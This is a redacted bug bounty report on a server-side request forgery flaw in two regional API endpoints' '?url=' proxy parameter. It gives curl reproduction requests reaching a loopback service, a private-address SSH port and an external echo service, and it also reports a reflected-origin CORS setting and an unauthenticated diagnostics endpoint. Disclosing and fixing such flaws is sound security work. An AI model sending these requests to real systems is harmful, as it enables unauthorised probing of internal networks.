# SSRF on Regional API Endpoints Allows Internal Network Access

**Bug Bounty Report**

*Publication note: Target domains, internal addresses and service ports, diagnostic paths, application identity, timestamps, error prefixes, and software versions have been replaced with placeholders or representative values. The request structure and response evidence are preserved. Loopback and private addresses below are illustrative; they do not disclose the target network.*

## Summary
The regional API endpoints (`region-a-api.example.com`, `region-b-api.example.com`) are vulnerable to Server-Side Request Forgery (SSRF) via the root proxy parameter (`?url=`). Unlike the production comparison, the regional endpoint returned responses associated with loopback HTTP and a private-address SSH service. This establishes inconsistent destination filtering, but not the filtering implementation or the private service's hosting platform.

## Vulnerability Type
Server-Side Request Forgery (SSRF)

## Affected Endpoints
- `https://region-a-api.example.com/?url=`
- `https://region-b-api.example.com/?url=`

## Description
The regional API endpoints (`region-a-api.example.com` and `region-b-api.example.com`) contain an SSRF vulnerability in proxy functionality at the root endpoint.

Production (`api.example.com`) returned `Host not allowed` for the recorded loopback request. Regional requests reached the demonstrated loopback HTTP service, private-address SSH service, and external HTTP endpoint. The available exchanges do not establish a complete allowlist or blocklist policy.

This allows an attacker to:
1. Access localhost services (`127.0.0.1:8080`)
2. Reach an SSH-speaking service at a private address (`10.0.0.10:22` is illustrative, not the original address/port)
3. Potentially enumerate additional internal services and ports (not demonstrated by the included exchanges)
4. Potentially access databases, caches, or admin panels on the internal network
5. Potentially probe metadata services if the network path allows it (metadata access and IMDS configuration are not verified here)

## Steps to Reproduce
1. Send a request to the region A endpoint with a localhost URL:

```bash
curl "https://region-a-api.example.com/?url=http://127.0.0.1:8080/"
```

Expected vulnerable response:

```json
{"message":"[REDACTED-APP] is active!","js":"[REDACTED-TIMESTAMP]"}
```

2. Send a request to the region A endpoint with a private-address SSH service URL (representative address and port):

```
   https://region-a-api.example.com/?url=http://10.0.0.10:22/
```

 Response:

```json
   {
     "message": "[REDACTED-PREFIX]: ClientResponseError: ... Expected HTTP/, RTSP/ or ICE/:

     b'SSH-2.0-OpenSSH_[REDACTED-VERSION]'
       ^"
   }
```
3. Confirm external SSRF behavior:

```bash
curl "https://region-a-api.example.com/?url=https://httpbin.org/ip"
```

Response:

```json
{"origin":"[REDACTED-PUBLIC-IP]"}
```

4. Compare with production behavior (blocked):

```bash
curl "https://api.example.com/?url=http://127.0.0.1:8080/"
```

Response:

```json
{"message":"[REDACTED-APP] Proxy: Host not allowed"}
```

## Impact
- Demonstrated reachability of a loopback HTTP service and an SSH-speaking service on a private address
- Potential access to other internal applications or data if reachable and exposed (not demonstrated)
- Potential server-side service and port enumeration through response differences (not separately demonstrated)
- Potential metadata exposure under misconfigured conditions; no credential theft or metadata access was demonstrated
- Any cross-origin, credentialed browser attack would require separate validation; it is not established by the included SSRF exchanges

## Additional Findings
Additional observations described in the source report; complete request/response evidence for these items is not reproduced below:

1. CORS misconfiguration (all endpoints)
  - `Access-Control-Allow-Origin` reflects arbitrary origins
  - `Access-Control-Allow-Credentials: true`
  - Actual credentialed browser exploitation would require further validation of cookies, authentication, and browser behavior

2. Unauthenticated `/diagnostics` endpoint (region A/B only)
  - `GET /diagnostics?cmd=info` discloses server version, uptime, and session count without authentication
  - Production (`api.example.com`) requires a token; regional instances do not

3. Publicly accessible OpenAPI documentation (not inherently a vulnerability)
  - `/docs` and `/openapi.json` are publicly accessible on all endpoints

## Recommended Fix
1. Apply consistent, explicit destination restrictions across regional and production deployments; the production error alone does not reveal the implementation
2. Block requests to private/link-local/localhost ranges:
  - `127.0.0.0/8`
  - `10.0.0.0/8`
  - `172.16.0.0/12`
  - `192.168.0.0/16`
  - `169.254.0.0/16`
3. Require authentication for `/diagnostics` on regional instances
4. Restrict CORS to trusted, explicit origins (do not reflect arbitrary origins)

